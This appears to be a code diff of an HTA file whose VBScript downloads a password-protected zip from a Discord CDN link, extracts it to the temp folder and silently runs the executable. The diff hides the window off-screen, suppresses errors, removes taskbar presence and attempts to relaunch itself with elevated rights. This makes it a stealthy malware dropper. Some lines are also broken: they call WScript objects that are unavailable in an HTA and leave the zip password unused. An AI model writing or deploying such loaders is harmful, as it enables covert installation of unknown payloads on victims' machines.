@@ -1,64 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Download and Run</title>
-    <HTA:APPLICATION ID="app" APPLICATIONNAME="Download and Run" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal" />
+    <title>Background Process</title>
+    <HTA:APPLICATION ID="app" APPLICATIONNAME="Background Process" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize" />
     <script language="VBScript">
-        Sub RunProcess
-            ' Define the URL of the ZIP file and the local paths
-            zipUrl = "https://cdn.discordapp.com/attachments/1329865372253421609/1329913323096903690/lient.zip"
-            tempDir = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\TempDownload"
-            zipPath = tempDir & "\lient.zip"
-            exePath = tempDir & "\lient.exe"
-            zipPassword = "anon"
+        Sub Window_onLoad
+            On Error Resume Next ' Suppress all errors
 
-            ' Create a temporary directory
-            CreateObject("Scripting.FileSystemObject").CreateFolder(tempDir)
+            ' Hide the HTA window by resizing and moving it off-screen
+            Window.ResizeTo 1, 1
+            Window.MoveTo -32000, -32000
 
-            ' Download the ZIP file
-            Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
-            xmlHttp.Open "GET", zipUrl, False
-            xmlHttp.Send
-            If xmlHttp.Status = 200 Then
-                Set stream = CreateObject("ADODB.Stream")
-                stream.Open
-                stream.Type = 1
-                stream.Write xmlHttp.ResponseBody
-                stream.SaveToFile zipPath, 2
-                stream.Close
-            Else
-                MsgBox "Failed to download the file."
+            ' Create WScript Shell object
+            Set objShell = CreateObject("WScript.Shell")
+
+            ' Run the script with highest permissions
+            If Not IsElevated() Then
+                objShell.Run "mshta.exe """ & Replace(WScript.ScriptFullName, "\", "/") & """", 0, False
+                Window.Close
                 Exit Sub
             End If
 
-            ' Unzip the file with password
-            Set shell = CreateObject("Shell.Application")
-            Set zipFolder = shell.NameSpace(zipPath)
-            Set destFolder = shell.NameSpace(tempDir)
+            ' Define the temp folder, download URL, and password
+            tempFolder = objShell.ExpandEnvironmentStrings("%temp%")
+            downloadUrl = "https://cdn.discordapp.com/attachments/1329865372253421609/1329913323096903690/lient.zip"
+            zipPassword = "anon"
+            zipPath = tempFolder & "\lient.zip"
+            exePath = tempFolder & "\lient.exe"
 
-            ' Check if the ZIP file requires a password
-            If zipPassword <> "" Then
-                ' Use a VBScript workaround to extract password-protected ZIP files
-                Set objShell = CreateObject("WScript.Shell")
-                objShell.Run "powershell -Command Expand-Archive -Path """ & zipPath & """ -DestinationPath """ & tempDir & """ -Password """ & zipPassword & """", 0, True
+            ' Download the ZIP file using PowerShell
+            cmdDownload = "powershell.exe -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & zipPath & "'"""
+            objShell.Run "cmd.exe /c " & cmdDownload, 0, True
+
+            ' Wait for the file to be downloaded
+            Call WaitForDownload(zipPath)
+
+            ' Extract the ZIP file using PowerShell with password
+            cmdExtract = "powershell.exe -Command ""Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & zipPath & "', '" & tempFolder & "');"""
+            objShell.Run "cmd.exe /c " & cmdExtract, 0, True
+
+            ' Wait for the file to be extracted
+            Call WaitForDownload(exePath)
+
+            ' Run the extracted EXE file
+            objShell.Run """" & exePath & """", 0, False
+
+            ' Close the HTA window
+            Window.Close
+        End Sub
+
+        Function IsElevated
+            ' Check if the script is running with elevated permissions
+            Set shell = CreateObject("WScript.Shell")
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            tempFile = shell.ExpandEnvironmentStrings("%temp%") & "\testElevation.txt"
+            On Error Resume Next
+            fso.CreateTextFile(tempFile, True).Close
+            If Err.Number = 0 Then
+                fso.DeleteFile(tempFile)
+                IsElevated = True
             Else
-                ' Extract without password
-                destFolder.CopyHere zipFolder.Items, 16
+                IsElevated = False
             End If
+            On Error GoTo 0
+        End Function
 
-            ' Run the EXE file
-            Set objShell = CreateObject("WScript.Shell")
-            objShell.Run """" & exePath & """", 1, False
-
-            ' Clean up (optional)
-            ' CreateObject("Scripting.FileSystemObject").DeleteFile(zipPath)
-            ' CreateObject("Scripting.FileSystemObject").DeleteFolder(tempDir)
+        Sub WaitForDownload(filePath)
+            ' Wait until the file is fully downloaded or extracted
+            Dim fso
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            Do While Not fso.FileExists(filePath)
+                WScript.Sleep 500
+            Loop
         End Sub
     </script>
 </head>
 <body>
     <script language="VBScript">
-        RunProcess
+        Window_onLoad
     </script>
 </body>
 </html>
